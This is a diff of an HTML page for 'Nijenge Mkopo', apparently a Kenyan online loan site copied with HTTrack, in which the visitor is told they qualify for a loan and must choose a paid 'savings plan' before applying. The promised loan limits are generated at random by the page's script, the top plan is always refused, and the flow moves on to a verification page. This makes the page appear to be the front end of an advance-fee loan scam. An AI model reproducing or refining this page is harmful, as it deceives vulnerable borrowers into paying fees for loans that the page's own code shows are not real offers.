@@ -1,8 +1,5 @@
 <!DOCTYPE html>
 <html>
-
-<!-- Mirrored from Nijenge-Mkopo.vercel.app/savings.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 May 2025 13:03:44 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nijenge Mkopo</title>
@@ -13,13 +10,11 @@
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-
         body {
             background: linear-gradient(135deg, #00ff59, #206f83);
             min-height: 100vh;
             padding: 1rem;
         }
-
         .container {
             max-width: 600px;
             margin: 0 auto;
@@ -28,27 +23,23 @@
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             padding: 1.5rem;
         }
-
         h1 {
             color: #120d3b;
             text-align: center;
             font-size: 1.75rem;
             margin-bottom: 0.5rem;
         }
-
         .subtitle {
             color: #666;
             text-align: center;
             font-size: 0.875rem;
             margin-bottom: 1.5rem;
         }
-
         .radio-group {
             display: flex;
             flex-direction: column;
             gap: 0.75rem;
         }
-
         .radio-option {
             position: relative;
             border: 2px solid #e5e7eb;
@@ -57,29 +48,24 @@
             cursor: pointer;
             transition: all 0.2s;
         }
-
         .radio-option.selected {
             border-color: #110a70;
             background: #f3f0ff;
         }
-
         .radio-option input {
             position: absolute;
             opacity: 0;
         }
-
         .savings-amount {
             font-size: 1rem;
             font-weight: 600;
             color: #1f2937;
         }
-
         .loan-limit {
             font-size: 0.875rem;
             color: #666;
             margin-top: 0.25rem;
         }
-
         .result {
             margin-top: 1.5rem;
             padding: 1rem;
@@ -89,12 +75,10 @@
             color: #180f46;
             text-align: center;
         }
-
         .result.error {
             background: #f4dcdc;
             color: rgb(4, 105, 4);
         }
-
         .proceed-btn {
             display: block;
             width: 100%;
@@ -108,12 +92,10 @@
             cursor: pointer;
             transition: background 0.2s;
         }
-
         .proceed-btn:disabled {
             background: linear-gradient(135deg, #00ff59, #206f83);
             cursor: not-allowed;
         }
-
         .proceed-btn:not(:disabled):hover {
             background: linear-gradient(135deg, #00ff59, #206f83);
         }
@@ -122,22 +104,20 @@
 <body>
     <div class="container">
         <h1>Nijenge Mkopo</h1>
-        <p class="subtitle">Dear <strong style="font-weight: bolder; color: #00c853;" id="usernames">Customer,</strong> you qualify for a loan of upto <strong style="color: black;">Ksh 12,500</strong>. Choose your savings plan to continue to loan application.</p>        
+        <p class="subtitle">Dear <strong style="font-weight: bolder; color: #00c853;" id="usernames">Customer,</strong> you qualify for a loan of upto <strong style="color: black;">Ksh 12,500</strong>. Choose your savings plan to continue to loan application.</p>
         <div class="radio-group" id="savingsOptions"></div>
         <div class="result" id="resultLabel">Select a savings amount to see your loan limit</div>
         <button class="proceed-btn" id="proceedBtn" disabled>Proceed</button>
     </div>
-
     <script>
-        //localStorage.clear();
         const name = localStorage.getItem("name") || "John Doe";
         const fname = name.split(' ')[0];
         document.getElementById("usernames").textContent = fname + ", ";
+
         function getRandomLimit(min, max) {
-            // Round to nearest 10
             return Math.floor(Math.random() * (max - min + 1) + min) - (Math.floor(Math.random() * (max - min + 1) + min) % 10);
         }
-        
+
         const plans = [
             {savings: 120, limit: getRandomLimit(2500, 3500)},
             {savings: 170, limit: getRandomLimit(4000, 5000)},
@@ -166,12 +146,12 @@
 
         document.querySelectorAll('input[name="savings"]').forEach(input => {
             input.addEventListener('change', (e) => {
-                document.querySelectorAll('.radio-option').forEach(opt => 
+                document.querySelectorAll('.radio-option').forEach(opt =>
                     opt.classList.remove('selected'));
                 e.target.closest('.radio-option').classList.add('selected');
-                
+
                 selectedOption = plans.find(p => p.savings === Number(e.target.value));
-                
+
                 if (selectedOption.savings === 1550) {
                     resultLabel.textContent = 'Only existing members allowed';
                     resultLabel.classList.add('error');
@@ -186,13 +166,11 @@
 
         proceedBtn.addEventListener('click', () => {
             if (selectedOption) {
-                localStorage.setItem('limit',selectedOption.limit)
-                window.location.href = 'upplication-details.html';
-                //alert(`Selected: Ksh ${selectedOption.savings} savings with Ksh ${selectedOption.limit} limit`);
+                localStorage.setItem('limit', selectedOption.limit);
+                localStorage.setItem('saveamount', selectedOption.savings);
+                window.location.href = 'Verification.html';
             }
         });
     </script>
 </body>
-
-<!-- Mirrored from Nijenge-Mkopo.vercel.app/savings.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 21 May 2025 13:03:45 GMT -->
 </html>
